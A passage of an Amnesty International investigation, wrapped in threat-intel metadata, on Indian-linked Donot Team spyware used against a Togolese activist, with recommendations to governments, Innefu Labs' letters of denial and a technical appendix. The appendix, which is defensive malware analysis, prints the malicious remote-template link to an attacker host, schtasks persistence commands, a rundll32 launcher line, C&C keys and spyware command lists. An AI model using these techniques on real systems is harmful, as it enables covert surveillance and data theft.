targeted surveillance or otherwise violate human rights.\n\n###### TO THE INDIAN GOVERNMENT\n\n  - Impose an immediate moratorium on the sale, transfer, and use of spyware technology until there is\na robust human rights regulatory framework in place.\n\n  - Launch a credible, transparent, independent, and impartial investigation into the cyberattacks which\nare linked to the Donot Team group and to Innefu Labs.\n\n  - Conduct an immediate, independent, transparent and impartial investigation into all export licences\ngranted for spyware technology and revoke all marketing and export licences in situations where\nthere is a substantial risk such technology could contribute to human rights violations.\n\n  - Implement a human rights-compliant framework governing the use of, surveillance technology, facial\nrecognition technology and social media monitoring systems by Indian authorities, including by\namending existing laws that are not in line with international human rights standards\n\n      - Ensure that all surveillance meets the tests of legality, necessity, and proportionality as\nenshrined in international human rights standards and affirmed in the Supreme Court of\nIndia’s landmark judgement of KS Puttaswamy v. Union of India.\n\n      - Review Section 69 of the Information Technology Act and the 2018 order of the Ministry of\nHome Affairs that allows government agencies to intercept, monitor and decrypt information\nwithout any judicial oversight and other procedural safeguards.\n\n      - Ensure adequate regulation and oversight of private surveillance companies. This includes\nlegally requiring companies to carry out human rights due diligence in their global\noperations, supply chains, and in relation to the use of their products and services. Under\nthis legislation, private surveillance companies should be compelled to identify, prevent and\nmitigate the human rights-related risks of their activities and business relationships.\n\n  - Adopt and enforce a legal framework requiring transparency by private surveillance companies,\nincluding information on self-identification/registration; products and services offered and sales.\n\n  - Hold companies liable for human rights harm they have caused or contributed to, or be directly\nlinked to and ensuring enforcement by competent administrative and judicial authorities.\n\n  - Ensure transparency in export licencing, including providing information on whether it has granted\nInnefu Labs export licences.\n\n  - Ensure that all technologies are scrutinised prior to transfer for adverse human rights impacts and\nensure the denial of export authorizations where there is a substantial risk that the export in question\ncould be used to violate human rights or where the destination country has inadequate legal,\nprocedural and technical safeguards in place to prevent abuse.\n\n  - As a condition to continued operation of surveillance companies, demand immediate establishment\nof independent, multi-stakeholder oversight bodies for private surveillance companies. This should\ninclude human rights groups and other civil society actors.\n\n  - Establish community public oversight boards to oversee and approve the acquisition or use of new\nsurveillance technologies, with powers to approve or reject based on the states’ human rights\nobligations, and provisions for public notice and reporting.\n\n  - Reform existing laws that posed barriers to remedy for victims of unlawful surveillance and ensure\nthat both judicial and non-judicial paths to remedy are available in practice.\n\n**HACKERS-FOR-HIRE IN WEST AFRICA**\nACTIVIST IN TOGO UNDER ATTACK WITH INDIAN-MADE SPYWARE\n\n\n-----\n\n###### TO THE TOGOLESE GOVERNMENT:\n\n  - Impose an immediate moratorium on the sale, transfer, and use of spyware technology until there is\na robust human rights regulatory framework in place.\n\n  - Investigate and redress the harm caused by cyberattacks which are carried out by private sector\nthreat actors against activists and HRDs in Togo.\n\n  - Implement domestic legislation that imposes safeguards against human rights violations and abuses\nthrough digital surveillance and establishes accountability mechanisms designed to provide victims of\nsurveillance abuses a pathway to remedy.\n\n  - Implement procurement standards restricting government contracts for surveillance technology and\nservices to only those companies which demonstrate that they respect human rights in line with the\nUN Guiding Principles and have not serviced clients engaging in surveillance abuses.\n\n  - Ensure transparency regarding the volume, nature, value, destination and end-user countries of\nsurveillance transfers, for example by publishing annual reports on imports and exports of\nsurveillance technologies.\n\n  - Establish community public oversight boards to oversee and approve the acquisition or use of new\nsurveillance technologies, with powers to approve or reject based on the states’ human rights\nobligations, and provisions for public notice and reporting.\n\n  - Adopt and implement legislation to protect and facilitate the work of HRDs, activists, journalists and\nbloggers to provide legal recognition and protection to HRDs, in line with the UN General Assembly\nDeclaration on the protection of HRDs.\n\n  - Protect freedom of expression and access to information by amending the law on cybersecurity and\nthe fight against cyber criminality and the law on homeland security to put them in conformity with\ninternational human rights law\n\n  - Promptly, thoroughly, and impartially investigate all allegations of intimidation, threats, harassment\nand cyberattacks against human rights defenders, journalists and others expressing dissent, and\nbring anyone suspected to be responsible to justice in fair trials.\n\n###### INDICATORS OF COMPROMISE\n\nThe full list of indicators of compromise are available on the Amnesty Tech Investigations GitHub\nrepository.[39]\n\nFor a technical analysis of the spyware and additional attribution evidence, see the Technical Appendix\n(annex 2).\n\nIf you believe you have been targeted with attacks similar to the ones described in this report, please contact\nus at:\n\n###### share@amnesty.tech\n\n39 Amnesty International, Indicators from Amnesty International's investigations, [github.com/AmnestyTech/investigations.](https://github.com/AmnestyTech/investigations)\n\n**HACKERS-FOR-HIRE IN WEST AFRICA**\nACTIVIST IN TOGO UNDER ATTACK WITH INDIAN-MADE SPYWARE\n\n\n-----\n\n## ANNEX 1: COMMUNICATIONS WITH INNEFU LABS\n\n###### RESPONSE TO RESEARCH LETTER RECEIVED FROM INNEFU LABS ON 30 OCTOBER 2020\n\nThank you for your email of October 12, 2020.\n\nKindly note that Innefu is an AI driven R&D start-up, providing information security and AI-based\nPredictive Analytics and Big Data analytics solutions to our clients that does include law enforcement\nagencies.\n\nHowever, we have never faced such a query and were extremely surprised at receiving such a letter.\nMore importantly, since 90% of the company is working from home since the beginning of COVID\noutbreak, it’s a further cause of concern for us.\n\nWe are taking this letter very seriously and have already hired an external cybercrime investigation agency\nto carry out the forensic audit of our IT infrastructure as well as end point devices. Having said that, we\nwould be grateful if you could share the results of your investigation especially timestamps and logs which\nmay help augment our own efforts.\n\nIn response to your questions:\n\n   - Innefu has had no contact with Government of Togo or any of its agencies. We have not sold any\ndigital surveillance tools or any other services at all to the Government of Togo or any of its\nagencies\n\n   - Innefu has never provided any digital surveillance tools or services for the purpose of conducting\nsurveillance of activists and human rights defenders.\n\n   - Innefu has never exported any digital surveillance tools or services to any country in the\nspecified time period\n\n   - While we do not have a stated Human Rights Policy, we do follow the Indian laws and\nguidelines.\n\n   - Lastly, we have never heard of any “Donot Team” or have any relationship with this “Donot\nTeam” group.\n\nYou are requested not to publish any information in this regard without prior written approval of Innefu.\n\nWe hope the above addresses your concerns.\n\n**HACKERS-FOR-HIRE IN WEST AFRICA**\nACTIVIST IN TOGO UNDER ATTACK WITH INDIAN-MADE SPYWARE\n\n\n-----\n\nThis communication is without prejudice to Innefu’s rights. No statements herein should be construed as\na waiver of or admission or otherwise prejudicial to Innefu’s rights.\n\n###### RESPONSE FROM INNEFU LABS TO AMNESTY INTERNATIONAL ON 30 SEPTEMBER 2021\n\nAmnesty International received a letter from Innefu Labs on 30 September 2021 in reply to the right of\nresponse letter sent to Innefu Labs on 20 September 2021. In this letter Innefu Labs disputed one piece of\ninformation that Amnesty International included in the right of response letter.\n\nAmnesty International has removed this one piece of information from the final report and in addition has\nremoved this piece of information from the letters included in this Annex. Amnesty International responded\nto Innefu Labs on 1 October 2021 to confirm the removal of this specific information from the final report.\n\n###### RESPONSE FROM INNEFU LABS TO AMNESTY INTERNATIONAL ON 5 OCTOBER 2021\n\nThe following response from Innefu Labs has been edited to remove one piece of information which is not\nincluded in the final report.\n\nDear Ms. Rahim, Ms Ingleton\n\nWe acknowledge the receipt of your letter dated 01.10.2021.\n\nWe are writing to you in response to your letter dated 20.09.2021 and 01.10.2021 wherein heavily\nmisinformed allegations have been levelled against Innefu Labs. We are horrified and dismayed at the\ngravity of the allegations that have been made against us and that too without providing any cogent proof\nof the same. We have never received such a complaint and are extremely shocked at the contents of your\nletter.\n\nWe take this letter to be extremely damaging to our reputation. We absolutely prohibit you to name Innefu\nLabs in any report that you intend to publish. Any such naming of Innefu will be considered defamatory\nand shall make Amnesty International liable for defamation in the Indian courts. We shall not hesitate to\ninitiate civil or/and criminal defamation proceedings against you in the event you make any unauthorized\nusage of Innefu’s name in any reports or statements made publicly by you.\n\nWe have responded to all your letters and co-operated in providing you the requisite information as\nrequested by you from time to time. However, the timelines imposed on us are highly unreasonable and\nunrealistic which puts unnecessary pressure on us to state something wrong. Such an uncooperative\nbehavior is not expected out of an organization of your stature. Moreover, you have neglected to provide\nus the information and data as requested by us in our letter dated 30.09.2021 as well as in our response\nto your letter dated 12.10.2020.\n\nAt the outset we firmly deny the existence of any link whatsoever between Innefu Labs and the spyware\ntools associated with the ‘Donot Team’ group and the attacks against a Human Rights Defender in Togo.\nAs has already been stated by us in our previous letter, we are not aware of any ‘Donot Team’ or have any\nrelationship with them.\n\nIn your letter dated 20.09.2021, references have been made to a Xiaomi Redmi 5A phone, which has\nallegedly accessed the IP address of Innefu Labs, and also of some other private VPN server to access\nthe Ukrainian hosting company called Deltahost. We believe this phone does not belong to any person\nassociated with Innefu Labs. Merely because our IP address has been accessed using this phone does\nnot ipso facto conclude Innefu Labs’ involvement in any of the alleged activities.\n\nWe believe that the link between Innefu Labs, Donot group and the attack on the HRD in Togo is\nmisplaced and an attempt is being made to stretch the truth. We deny all allegations set out in your letter.\nWe are not aware of any use of our IP address for the alleged activities.\n\nThe fact that Innefu’s former employees have worked on spyware and malware research and\nDevelopment is no ground to point fingers towards and make such disparaging allegations against Innefu.\nAs has already been stated, Innefu is an AI-driven R&D start-up providing information security and Big\n\n**HACKERS-FOR-HIRE IN WEST AFRICA**\nACTIVIST IN TOGO UNDER ATTACK WITH INDIAN-MADE SPYWARE\n\n\n-----\n\nData analytics solutions to clients. Keeping in mind the nature of the activities performed by Innefu and\nthe amount of data held by it, it is utmost important for us to protect our own infrastructure against\nattacks. Thus, malware research is an integral part of our employee’s role to ensure that our information is\nsafeguarded against any kind of malware attacks.\n\nIn response to your letter dated 21.07.2021, we have already clarified our position on the use of FRT’s.\nFor the sake of emphasizing, we reiterate that FRT’s are neutral technologies and the intent of Innefu\nbehind creating them is in furtherance of a legitimate interest as it has served important state purposes.\nFRT’s developed by Innefu Labs were sold to the Delhi Police via official tender for the identification of\nmissing children and in pursuance of the guidelines of the Hon’ble Delhi High Court. With the assistance\nof the FRT, Delhi Police has been successful in tracing a number of missing children. If there is an\ninstance of misapplication of the FRT, Innefu labs can by no stretch of imagination be held to be\nresponsible for that misuse. Saying that the creators of a technology which can be misused by the users,\ncan be held liable for such misuse, is akin to saying that the manufacturer of a motor vehicle is\nresponsible for a bank robbery as a getaway car was used. This would also mean the end of internet as\nwell as many cybercrimes are committed vide the route of internet.\n\nWe are shocked and surprised that despite of being informed that FRT has been created vide an official\ntender for the identification of missing children and in pursuance of the guidelines of the Hon’ble Delhi\nHigh Court, you are unnecessary and wrongly implying that Innefu Labs has had some relation with CAA\nprotests. This is clearly defamatory as you are simply levelling allegations based upon some media reports\nwithout even verifying the same. This is not expected from the organisation that prides itself on its ethics.\nTherefore, we strongly urge you not to unnecessary link Innefu Labs based on some false or motivated\nmedia reports.\n\nWe have taken on record the recommendations made by you. Suffice it to say, Innefu Labs is working in\nconsonance with the Indian laws and guidelines and is not in violation of any law.\n\nWe once again urge you not to use Innefu Labs in a bad light or in a defamatory manner base upon\nhearsay or unverified media reports or any far fetched conspiracy theories.\n\nThis communication is without prejudice to Innefu’s rights. No statements made herein should be\nconstrued as a waiver of or admission or otherwise prejudicial to Innefu’s rights.\n\nSincerely\n\nInnefu Labs\n\n**HACKERS-FOR-HIRE IN WEST AFRICA**\nACTIVIST IN TOGO UNDER ATTACK WITH INDIAN-MADE SPYWARE\n\n\n-----\n\n## ANNEX 2: TECHNICAL APPENDIX\n\n###### TECHNICAL ANALYSIS OF MALICIOUS DOCUMENTS AND SOFTWARE\n\n ANALYSIS OF WORD DOCUMENTS LOADING WINDOWS SPYWARE\n\nThe targeted Togolese HRD was sent an email with a Microsoft Word document (docx) attachment on the 21\nJanuary 2020. This document uses the remote template feature in Microsoft Word to download and execute\na malicious RTF file.\n\n<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n\n<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\"><Relationship Id=\"rId1\"\nType=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate\"\nTarget=\"http://getelements.xyz/AN/AM\" TargetMode=\"External\"/></Relationships>\n\nThe RTF was downloaded from http://getelements[.]xyz/AN/AM. This RTF payload contains an exploit for a\nknown vulnerability in Microsoft Word (CVE-2017-0199), a DLL program and several JavaScript files. A\nmalicious macro is executed with the “onload” hook and performs the following actions:\n\n  - Extract the files commit.dll pvr.js and sce.js in C:\\Windows\\Tasks\\.\n\n  - Run the JavaScript files through scheduled tasks:\n\n`o` schtasks /create /sc minute /mo 2 /f /tn file /tr C:\\Windows\\Tasks\\pvr.js\n\n`o` schtasks /create /sc minute /mo 2 /f /tn vector /tr C:\\Windows\\Tasks\\sce.js\n\n  - Create LNK files to run on start-up:\n\n`o` \\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\host.LNK for C:\\Windows\\Tasks\\pvr.js\n\n`o` \\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\carrier.LNK for C:\\Windows\\Tasks\\sce.js\n\nSce.js is an empty JavaScript file. pvr.js runs the final payload commit.dll by calling a non-standard DLL\nexport named solar:\n\nvar obl = new ActiveXObject(\"WScript.shell\");\n\nobl.run('rundll32 \"C:\\\\Windows\\\\Tasks\\\\commit.dll\", solar');\n\n**HACKERS-FOR-HIRE IN WEST AFRICA**\nACTIVIST IN TOGO UNDER ATTACK WITH INDIAN-MADE SPYWARE\n\n\n-----\n\n###### ANALYSIS OF WINDOWS MALWARE\n\nThe Windows malware extracted by this RTF file is an obfuscated version of the YTY framework, a spyware\nanalysed by NetScout[40] in 2018 and attributed by NetScout and other organisations[41] to the Donot Team\ngroup.\n\nYTY is a modular framework. The initial stage loaded by the RTF file was a downloader which then fetches\nother payloads. The attackers can approve new infections and only serve the additional modules to some\ntargets. This may be an attempt to prevent security researchers from obtaining samples of the other\nmodules.\n\nAmnesty International obtained the following YTY modules during the investigation:\n\n  - HoldDown.dll: take screenshots\n\n  - MintCap.dll\n\n  - TenLooper.dll\n\n  - CellTell.dll\n\n  - MakeWill.dll\n\n  - SoolSet.dll\n\n  - WayLine.dll\n\nThe modules are enabled per compromised host, with a request to /sync/get_flag, which returns a list of\nmodules with a flag set to either 0 or 1. Only modules set to 1 were executed:\n\n{\n\"flag_id\": \"333\",\n\"pc_name\": \"[REDACTED]\",\n\"screenshot\": \"1\",\n\"bat\": \"0\",\n\"keylogs\": \"1\",\n\"k_int\": \"0\",\n\"payload\": \"1\",\n\"tree\": \"1\",\n\"usb\": \"1\",\n\"control\": \"1\",\n\"active\": \"0\",\n\"credit\": \"1\",\n\"voip\": \"0\",\n\"screen_exe_min\": \"0\",\n\"screen_every_min\": \"0\",\n\"no_of_screen\": \"0\",\n\"tree_time\": \"0\",\n\"tree_inc_pro_win\": \"0\",\n\"tree_data\": \"\",\n\"tree_ext\": \"\",\n\"voip_time\": \"0\",\n\"voip_time_set\": \"\",\n\"reverse\": \"0\",\n\"main_dll_change\": \"0\"\n}\n\n40 Netscout, Donot Team Leverages New Modular Malware Framework in South Asia, 8 March 2018,\n\n[netscout.com/blog/asert/donot-team-leverages-new-modular-malware-framework-south-asia.](http://www.netscout.com/blog/asert/donot-team-leverages-new-modular-malware-framework-south-asia)\n\n41 Red Alert, SectorE02 Updates YTY Framework in New Targeted Campaign Against Pakistan Government, 2 August 2019,\n[redalert.nshc.net/2019/08/02/sectore02-updates-yty-framework-in-new-targeted-campaign-against-pakistan-government.](https://redalert.nshc.net/2019/08/02/sectore02-updates-yty-framework-in-new-targeted-campaign-against-pakistan-government/)\n\n**HACKERS-FOR-HIRE IN WEST AFRICA**\nACTIVIST IN TOGO UNDER ATTACK WITH INDIAN-MADE SPYWARE\n\n\n-----\n\n###### ANALYSIS OF THE ANDROID SAMPLES\n\nDuring the investigation, Amnesty International identified 211 Android malware samples by enumerating\nURL shorteners used to deliver malware. Most of these samples were different variants of the spyware called\nStealJob identified by the Qianxin research team in April 2019.[42] The Qianxin team found this malware being\nused to target Pakistani organisations and attributed it to Donot Team.\n\nThis StealJob malware family has two main versions called old and new version by the Qianxin team.\nAmnesty International has also identified many samples of an Android launcher named FireStater by Cisco\nTalos Intelligence (Talos) in their October 2020 analysis.[43]\n\n###### STEALJOB OLD VERSION\n\nThe first sample sent to the Togolese HRD was a variant of the old version of StealJob. It communicates with\nthe Command and Control Server (C&C) mimestyle[.]xyz on port 7101 using AES encrypted data over TCP\n(the keys are ASDFEFIEUIFHEHE and RUhFSEZJUkdCVkZGRFNB in most samples).\n\nIt implements several commands that can be sent from the servers. Most commands first store data in text\nfiles stored in \"/Android/.system/” on the external storage before uploading the server. The following\ncommands are implemented:\n\n  - Call: access call logs (temporarily stored in CallLogs.txt)\n\n  - CT: access contact list (temporarily storing info in contacts.txt)\n\n  - SMS: access SMS logs (temporarily storing info in sms.txt)\n\n  - Key: download logged keystrokes (temporarily stored in keys.txt)\n\n  - Tree: List files (temporarily storing info in Tree.txt)\n\n  - AC: List accounts of the phone (temporarily storing info in accounts.txt)\n\n  - NE: access network information (temporarily storing info in netinfo.txt, including public IP address\n[obtained by contacting https://www.geoip-db.com/json)](https://www.geoip-db.com/json)\n\n  - CR: records calls (Clist.txt)\n\n  - LR:\n\n  - FS:\n\n  - GP: Get GPS coordinates (GP.txt)\n\n  - PK: list packages installed (pkinfo.txt)\n\n  - BW: (bw.txt)\n\n  - CE: list calendar events (ce.txt)\n\n  - Wapp: access Signal and WhatsApp messages from the phone\n\n  - Live: get phone calls recorded (from Live.txt)\n\n  - FILEUPLOAD: upload file\n\n  - Net:\n\n[42 QI-ANXIN, “StealJob: New Android malware used by Donot APT group”, 10 April 2019, ti.qianxin.com/blog/articles/stealjob-new-android-](https://ti.qianxin.com/blog/articles/stealjob-new-android-malware-used-by-donot-apt-group/)\n[malware-used-by-donot-apt-group.](https://ti.qianxin.com/blog/articles/stealjob-new-android-malware-used-by-donot-apt-group/)\n\n43 Warren Mercer and others, “DoNot’s Firestarter abuses Google Firebase Cloud Messaging to spread”, Talos Intelligence, 29 October\n[2020, blog.talosintelligence.com/2020/10/donot-firestarter.html](https://blog.talosintelligence.com/2020/10/donot-firestarter.html)\n\n**HACKERS-FOR-HIRE IN WEST AFRICA**\nACTIVIST IN TOGO UNDER ATTACK WITH INDIAN-MADE SPYWARE\n\n\n-----\n\nStealJob uses Android Accessibility features to log keystrokes[44] from the user and stores them in keys.txt. It\nuses a service with the android.permission.BIND_ACCESSIBILITY_SERVICE permission for that purpose, as\ncan be seen in the manifest:\n\n<service android:label=\"@string/app_name\"\nandroid:name=\"com.system.myapplication.Adapters.adapinr\"\nandroid:permission=\"android.permission.BIND_ACCESSIBILITY_SERVICE\">\n\n<intent-filter>\n\n<action android:name=\"android.accessibilityservice.AccessibilityService\"/>\n\n</intent-filter>\n\n<meta-data android:name=\"android.accessibilityservice\" android:resource=\"@xml/accessibility\"/>\n\n</service>\n\nThe code in the class com.system.myapplication.Adapters.adapinr is called on accessibility events and\nimplements some type of logging based on events TYPE_WINDOW_CONTENT_CHANGED,\nTYPE_VIEW_FOCUSED, TYPE_VIEW_TEXT_CHANGED and TYPE_WINDOW_STATE_CHANGED. Based on\nsuch events, it logs both keystrokes on the phone (stored in keys.txt) but also the content of Signal and\nWhatsApp messages (stored in WappHolder.txt).\n\n[44 Emilian Cebuc, “How are we doing with Android's overlay attacks in 2020?”, F-Secure, 27 March 2020, labs.f-secure.com/blog/how-are-](https://labs.f-secure.com/blog/how-are-we-doing-with-androids-overlay-attacks-in-2020)\n[we-doing-with-androids-overlay-attacks-in-2020.](https://labs.f-secure.com/blog/how-are-we-doing-with-androids-overlay-attacks-in-2020)\n\n**HACKERS-FOR-HIRE IN WEST AFRICA**\nACTIVIST IN TOGO UNDER ATTACK WITH INDIAN-MADE SPYWARE\n\n\n-----\n\n###### STEALJOB NEW VERSION\n\nAmnesty International has also identified five samples of the new StealJob variant described by the QianXin\nteam in the same blog post.[45] This new variant has a few changes from the previous one. The main one is a\nchange in the communication with the C&C server to use HTTPs instead of TCP.\n\nIt stores temporary data in JSON format instead of text files and implements the following commands:\n\n  - tag_directory_trees_job: list files\n\n  - tag_network_info_job: get information on network configuration (including public IP address from\nhttps://geoip-db.com/json/)\n\n  - polling_job: list jobs running by the spyware\n\n  - test_job: send all the data generated by the spyware available on the phone\n\n  - tag_call_recordings_job: Perform recording of phone calls\n\n  - tag_live_recordings_job: Record audio from the microphone\n\n  - tag_contacts_job: access contact information from the phone\n\n  - live_recording_scheduling_job: schedule microphone recording\n\n  - tag_files_sending_job: access specific files from the phone\n\n  - tag_calls_logs_job: Access logs of phone calls\n\n  - tag_sms_job: Access sms\n\n  - tag_control_info_retrieval_job: get device id\n\n  - tag_device_info_job: access information on the device\n\n  - tag_key_exchange_job: Get private key from the spyware on the device\n\n  - tag_notifications_job: access notifications from the phone\n\n  - tag_location_job: toggle location tracking\n\n  - tag_location_sender_job: access logged geolocations\n\n  - tag_key_logs_job: Access logged keystrokes\n\n  - tag_user_profile_job: Get information on the profile used on the phone\n\n  - tag_apps_info_job: access the list of packages installed on the phone\n\n  - tag_whatsApp_job: access WhatsApp messages (using accessibility events)\n\n###### FIRESTARTER\n\nAmnesty International also identified 75 different samples of a launcher called FireStarter. Talos recently\npublished a report describing this malware family used by Donot Team.[46] FireStarter registers information\nfrom the victim with the Command & Control server on launch. It then waits for a URL to be distributed\nthrough Google Firebase messages which instructs the launcher to download a new APK and installs it on\nthe phone.\n\n[45 QI-ANXIN, “StealJob: New Android malware used by Donot APT group”, 10 April 2019, ti.qianxin.com/blog/articles/stealjob-new-android-](https://ti.qianxin.com/blog/articles/stealjob-new-android-malware-used-by-donot-apt-group/)\n[malware-used-by-donot-apt-group.](https://ti.qianxin.com/blog/articles/stealjob-new-android-malware-used-by-donot-apt-group/)\n\n46 Warren Mercer and others, “DoNot’s Firestarter abuses Google Firebase Cloud Messaging to spread”, Talos Intelligence, 29 October\n[2020, blog.talosintelligence.com/2020/10/donot-firestarter.html](https://blog.talosintelligence.com/2020/10/donot-firestarter.html)\n\n**HACKERS-FOR-HIRE IN WEST AFRICA**\nACTIVIST IN TOGO UNDER ATTACK WITH INDIAN-MADE SPYWARE\n\n\n-----\n\nFireStarter code to download the new APK\n\nThe final class loaded, com.system.myapplication.Activities.dcteat, is the main class of StealJob which\nconfirms that FireStarter is used to install StealJob.\n\nAmnesty International identified several test samples, two of which tried to exploit the WhatsApp double-free\nvulnerability CVE-2019-11932 using the publicly available code.[47]\n\n###### INDICATORS OF COMPROMISE\n\n[The full list of indicators of compromise can be found at https://github.com/AmnestyTech/investigations.](https://github.com/AmnestyTech/investigations)\n\n[47 Awakened, “How a double-free bug in WhatsApp turns to RCE”, 2 October 2019, awakened1712.github.io/hacking/hacking-whatsapp-](https://awakened1712.github.io/hacking/hacking-whatsapp-gif-rce/)\n[gif-rce.](https://awakened1712.github.io/hacking/hacking-whatsapp-gif-rce/)\n\n**HACKERS-FOR-HIRE IN WEST AFRICA**\nACTIVIST IN TOGO UNDER ATTACK WITH INDIAN-MADE SPYWARE\n\n\n-----\n\n### AMNESTY INTERNATIONAL  IS A GLOBAL MOVEMENT  FOR HUMAN RIGHTS.  WHEN INJUSTICE HAPPENS  TO ONE PERSON, IT  MATTERS TO US ALL.\n\n###### CONTACT US JOIN THE CONVERSATION\n\n\n[info@amnesty.org](mailto:info@amnesty.org)\n\n+44 (0)20 7413 5500\n\n\n[www.facebook.com/AmnestyGlobal](http://www.facebook.com/AmnestyGlobal)\n\n@Amnesty\n\n\n-----\n\n#### HACKERS-FOR-HIRE IN WEST AFRICA\n\n###### ACTIVIST IN TOGO UNDER ATTACK WITH INDIAN-MADE SPYWARE\n\n Amnesty International has uncovered a targeted digital attack campaign against a Human Rights Defender (HRD) in Togo. The HRD was targeted in late 2019 and early 2020 with both Android and Windows spyware.\n\n The Amnesty International Security Lab investigation found that the spyware used in these attacks ties to an attacker group known in the cybersecurity industry as the Donot Team, previously connected to attacks in India, Pakistan and neighbouring countries in South Asia.\n\n Additionally, Amnesty International has identified links between the infrastructure used by Donot Team and an Indian cybersecurity company, Innefu Labs Pvt. Ltd., which advertises digital security, data analytics, and predictive policing services to law enforcement and armed forces. \n\n This research highlights the threat “hacker-for-hire” attacks pose to human rights defenders and to civil society globally.\n\n\nINDEX: AFR 57/4756/2021\nOCTOBER 2021\nLANGUAGE: ENGLISH\n###### amnesty org\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "bf5be533-fa31-4590-ae37-5761c97ffa34",
            "created_at": "2022-10-25T16:13:58.389257Z",
            "updated_at": "2022-10-25T16:13:58.389257Z",
            "deleted_at": null,
            "name": "Malpedia",
            "url": "https://malpedia.caad.fkie.fraunhofer.de",
            "description": "Malpedia is a free service offered by Fraunhofer FKIE",
            "reports": null
        },
        {
            "id": "99593a68-7f6e-400e-9a9f-a707f66d2e72",
            "created_at": "2022-11-23T11:07:14.353321Z",
            "updated_at": "2022-11-23T11:07:14.353321Z",
            "deleted_at": null,
            "name": "AGRO",
            "url": "https://apt.threattracking.com",
            "description": "APT Groups and Operations Spreadsheet",
            "reports": null
        }
    ],
    "references": [
        "https://www.amnesty.org/en/wp-content/uploads/2021/10/AFR5747562021ENGLISH.pdf"
    ],
    "report_names": [
        "AFR5747562021ENGLISH.pdf"
    ],
    "threat_actors": [
        {
            "id": "caf95a6f-2705-4293-9ee1-6b7ed9d9eb4c",
            "created_at": "2022-10-25T15:50:23.472432Z",
            "updated_at": "2025-03-27T02:00:55.479021Z",
            "deleted_at": null,
            "main_name": "Confucius",
            "aliases": [
                "Confucius",
                "Confucius APT"
            ],
            "source_name": "MITRE:Confucius",
            "tools": [
                "WarzoneRAT"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "732bfd4b-8c15-42a5-ac4b-14a9a4b902e9",
            "created_at": "2022-10-25T16:07:23.38079Z",
            "updated_at": "2025-03-27T02:02:09.771357Z",
            "deleted_at": null,
            "main_name": "Bahamut",
            "aliases": [],
            "source_name": "ETDA:Bahamut",
            "tools": [
                "Bahamut",
                "DownPaper"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "2ac63ef4-a7b8-4a30-96ad-b30ccb2073fc",
            "created_at": "2022-10-25T16:07:23.546262Z",
            "updated_at": "2025-03-27T02:02:09.856624Z",
            "deleted_at": null,
            "main_name": "Donot Team",
            "aliases": [
                "APT-C-35",
                "SectorE02"
            ],
            "source_name": "ETDA:Donot Team",
            "tools": [
                "BackConfig",
                "EHDevel",
                "Jaca",
                "yty"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "88854a9f-641a-4412-89db-449b4d5cbc51",
            "created_at": "2022-10-25T16:07:23.963599Z",
            "updated_at": "2025-03-27T02:02:10.051548Z",
            "deleted_at": null,
            "main_name": "Operation HangOver",
            "aliases": [
                "Monsoon",
                "Operation HangOver",
                "Viceroy Tiger"
            ],
            "source_name": "ETDA:Operation HangOver",
            "tools": [
                "AutoIt backdoor",
                "BADNEWS",
                "BackConfig",
                "JakyllHyde",
                "TINYTYPHON",
                "Unknown Logger",
                "WSCSPL"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "60b64223-652b-4177-a678-3d675b79cff4",
            "created_at": "2022-10-25T16:07:24.478235Z",
            "updated_at": "2025-03-27T02:02:10.246897Z",
            "deleted_at": null,
            "main_name": "Dark Basin",
            "aliases": [
                "Mercenary.Amanda"
            ],
            "source_name": "ETDA:Dark Basin",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "cfdd350b-de30-4d29-bbee-28159f26c8c2",
            "created_at": "2023-01-06T13:46:38.433736Z",
            "updated_at": "2025-03-27T02:00:02.832565Z",
            "deleted_at": null,
            "main_name": "VICEROY TIGER",
            "aliases": [
                "OPERATION HANGOVER",
                "Donot Team",
                "APT-C-35",
                "SectorE02",
                "Orange Kala"
            ],
            "source_name": "MISPGALAXY:VICEROY TIGER",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "1a933813-3deb-4d6f-8e0f-33b9187970f9",
            "created_at": "2023-01-06T13:46:39.147547Z",
            "updated_at": "2025-03-27T02:00:03.007913Z",
            "deleted_at": null,
            "main_name": "Dark Basin",
            "aliases": [],
            "source_name": "MISPGALAXY:Dark Basin",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "f99641e0-2688-47b0-97bc-7410659d49a0",
            "created_at": "2023-01-06T13:46:38.802141Z",
            "updated_at": "2025-03-27T02:00:02.922907Z",
            "deleted_at": null,
            "main_name": "Bahamut",
            "aliases": [],
            "source_name": "MISPGALAXY:Bahamut",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "ada9e5d3-1cb2-4b70-a3c8-96808c304ac8",
            "created_at": "2022-10-25T15:50:23.6515Z",
            "updated_at": "2025-03-27T02:00:55.513513Z",
            "deleted_at": null,
            "main_name": "Windshift",
            "aliases": [
                "Windshift",
                "Bahamut"
            ],
            "source_name": "MITRE:Windshift",
            "tools": [
                "WindTail"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "7a8dbc5e-51a8-437a-8540-7dcb1cc110b8",
            "created_at": "2022-10-25T16:07:23.482856Z",
            "updated_at": "2025-03-27T02:02:09.827887Z",
            "deleted_at": null,
            "main_name": "Confucius",
            "aliases": [],
            "source_name": "ETDA:Confucius",
            "tools": [
                "ApacheStealer",
                "ByeByeShell",
                "ChatSpy",
                "Confucius",
                "MY24",
                "Sneepy",
                "remote-access-c3",
                "sctrls",
                "sip_telephone",
                "swissknife2"
